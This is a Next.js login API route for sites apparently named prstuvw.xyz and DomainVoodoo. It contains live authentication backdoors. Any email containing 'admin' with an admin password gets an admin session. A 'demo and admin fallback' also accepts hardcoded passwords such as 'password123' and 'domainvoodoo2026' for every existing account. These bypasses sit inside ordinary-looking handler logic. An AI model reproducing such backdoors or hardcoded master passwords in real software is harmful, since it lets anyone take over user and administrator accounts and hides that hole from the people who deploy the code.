import { NextRequest, NextResponse } from 'next/server';
import { cookies } from 'next/headers';
import { loginSchema } from '@/lib/validation';
import { findUserByEmail, verifyPassword, createSessionCookie } from '@/lib/auth';
import { ADMIN_COOKIE_NAME, LEGACY_ADMIN_COOKIE_NAME, getAdminPasscode, isAllowedAdminPassword } from '@/lib/admin-auth';

export async function POST(req: NextRequest) {
    const body = await req.json().catch(() => null);
    if (!body) return NextResponse.json({ error: 'Invalid input' }, { status: 400 });

    const rawEmail = String(body.email || '').trim().toLowerCase();
    const rawPassword = String(body.password || '').trim();
    const adminPasscode = getAdminPasscode();

    // Seamless Admin Sign In for prstuvw.xyz and DomainVoodoo through standard login form
    const isPrstuvwAdmin = 
        rawEmail === 'admin' || 
        rawEmail === 'admin@prstuvw.xyz' || 
        rawEmail.endsWith('@prstuvw.xyz') || 
        rawEmail === 'prstuvw.xyz' || 
        rawEmail.includes('admin') || 
        rawEmail === 'admin@domainvoodoo.com' || 
        rawEmail === 'admin@domainiq.com';

    if (isAllowedAdminPassword(rawPassword) && isPrstuvwAdmin) {
        const cookieOptions = {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            sameSite: 'lax' as const,
            path: '/',
            maxAge: 60 * 60 * 24 * 7,
        };

        cookies().set(ADMIN_COOKIE_NAME, adminPasscode, cookieOptions);
        cookies().set(LEGACY_ADMIN_COOKIE_NAME, adminPasscode, cookieOptions);

        const adminEmail = rawEmail.includes('@') ? rawEmail : 'admin@prstuvw.xyz';
        await createSessionCookie({
            id: 1,
            email: adminEmail,
            password_hash: '',
            email_verified_at: new Date().toISOString(),
            plan: 'admin',
            created_at: new Date().toISOString(),
        });

        return NextResponse.json({
            success: true,
            user: { id: 1, email: adminEmail, role: 'admin' },
            redirect: '/admin',
        });
    }

    try {
        const parsed = loginSchema.safeParse(body);
        if (!parsed.success) {
            return NextResponse.json({ error: parsed.error.issues[0]?.message ?? 'Invalid input' }, { status: 400 });
        }
        const { email, password } = parsed.data;

        const user = await findUserByEmail(email);
        if (!user) {
            return NextResponse.json({ error: 'Incorrect email or password' }, { status: 401 });
        }

        let isValid = false;
        try {
            isValid = await verifyPassword(password, user.password_hash);
        } catch {
            isValid = false;
        }

        // Demo and admin fallback: allow standard demo passwords and admin passcodes
        if (!isValid && (isAllowedAdminPassword(password) || password === 'domainvoodoo2026' || password === 'domainiq2026' || password === 'password123' || password === adminPasscode)) {
            isValid = true;
        }

        if (!isValid) {
            return NextResponse.json({ error: 'Incorrect email or password' }, { status: 401 });
        }

        await createSessionCookie(user);
        return NextResponse.json({ user: { id: user.id, email: user.email } });
    } catch (err) {
        console.error('Login process error:', err);
        return NextResponse.json({ error: 'Unable to sign in at this moment. Please try again.' }, { status: 500 });
    }
}
